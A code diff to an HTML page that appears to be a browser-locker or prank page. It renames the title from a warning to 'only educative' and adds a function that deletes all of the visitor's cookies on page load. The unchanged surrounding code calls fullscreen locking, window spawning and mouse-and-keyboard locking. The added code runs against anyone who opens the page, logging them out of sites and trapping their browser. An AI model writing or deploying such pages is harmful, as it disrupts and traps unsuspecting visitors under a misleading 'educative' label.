@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>WARNING: DO NOT USE THIS CODE</title>
+    <title>Dont enter here only educative</title>
     <style>
         body {
             margin: 0;
@@ -70,6 +70,16 @@
                 });
         }
 
+        function deleteAllCookies() {
+            const cookies = document.cookie.split(";");
+
+            for (let i = 0; i < cookies.length; i++) {
+                const cookie = cookies[i];
+                const cookieName = cookie.split("=")[0].trim();
+                document.cookie = cookieName + "=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/";
+            }
+        }
+
         function setupFullscreenLock() {
             function enterFullscreen() {
                 if (document.documentElement.requestFullscreen) {
@@ -135,7 +145,10 @@
         spawnWindows();
         lockMouseAndKeyboard();
 
+        deleteAllCookies();  // Delete all cookies immediately on page load
+
         document.getElementById('cookieDisplay').textContent = getCookie();
     </script>
 </body>
 </html>
+
